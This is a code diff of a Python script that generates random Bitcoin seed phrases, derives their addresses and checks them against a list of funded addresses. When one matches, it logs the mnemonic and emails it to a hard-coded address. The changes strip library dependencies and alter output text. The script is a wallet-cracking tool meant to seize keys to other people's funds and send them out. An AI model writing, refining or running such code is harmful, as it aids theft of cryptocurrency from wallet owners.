@@ -1,12 +1,10 @@
 import hashlib
-import bitcoinlib
 import time
 import os
 import hmac, struct
 import bit
 import smtplib
 import sys
-from tqdm import tqdm
 sys.setrecursionlimit(5000)
 block_cipher = None
 
@@ -20,10 +18,8 @@ screen_print_after_keys = 1917
 
 def loadadrs():
     btc_list = set()
-    for i in tqdm(range(100)):
-        f = open("Bitcoin_addresses.txt", "r", encoding='utf-8')
-        btc_list.update(f.read().splitlines())
-        pass
+    f = open("Bitcoin_addresses.txt", "r", encoding='utf-8')
+    btc_list.update(f.read().splitlines())
     f.close()
     #print(len(btc_list))
     print("Загрузка завершена")
@@ -39,7 +35,7 @@ def check_address(addr, btc_list, mnem):
     if addr in btc_list:
         print ('Win')
         f = open("Win.txt", "a")
-        f.writelines(mnem + " " + addr + "\n")
+        f.writelines("Mnemonic words " + mnem + " Address: " + addr + "\n")
         f.close()
         to_addr = "kabalvlad@tut.by"
         subject = "Найдена мнемоника BTC"
@@ -99,11 +95,7 @@ def create_valid_mnemonics(strength=128):
     return " ".join(result)
 
 ################################################################
-def entropy_bits_to_mnemonic(entropy_bits):
-    words = bitcoinlib.mnemonic.Mnemonic().generate(entropy_bits)
-# bitcoinlib.keys.HDKey.from_passphrase(Mnemonic().generate(256)).address()  # very slow
-# seed = bitcoinlib.mnemonic.Mnemonic().to_seed(words)                       # hashlib is faster
-    return words
+
 
 ################################ x100 faster
 def mnem_to_seed(words):
@@ -175,26 +167,6 @@ def derive_bip32childkey(parent_key, parent_chain_code, i):
     return key, chain_code
 
 ################################
-# =============================================================================
-# def seed_to_privatekey(seed, n=1):
-#     b = bitcoinlib.keys.HDKey.from_seed(seed)
-#     flg = False
-#     const = "m/44'/0'/0'/0/"
-#     for k in range(n):
-#         b0=b.subkey_for_path(const + str(k))
-#         flg = check_address(b0.address())
-#         if flg == True:
-#             break
-# #    b0=b.subkey_for_path("m/44'/0'/0'/0/0")
-# #    b0.address()
-# #    b0.hash160.hex()
-# #    b0.private_hex
-# #    b1=b.subkey_for_path("m/44'/0'/0'/0/1")
-# #    b2=b.subkey_for_path("m/44'/0'/0'/0/2")
-# #    b3=b.subkey_for_path("m/44'/0'/0'/0/3")
-# #    b4=b.subkey_for_path("m/44'/0'/0'/0/4")
-#     return flg
-# =============================================================================
 
 def do_work_loop(entropy_bits):
 #    mnem = entropy_bits_to_mnemonic(entropy_bits)
@@ -238,5 +210,5 @@ def generate_mnem_address_pairs():
 ###############################################################################
 if __name__ == '__main__':
     print('[+] Starting.........Wait.....')
-    print('[+] Load base address BTC.....')
+    print('[+] Load base address BTC..... 3-5 min')
     generate_mnem_address_pairs()
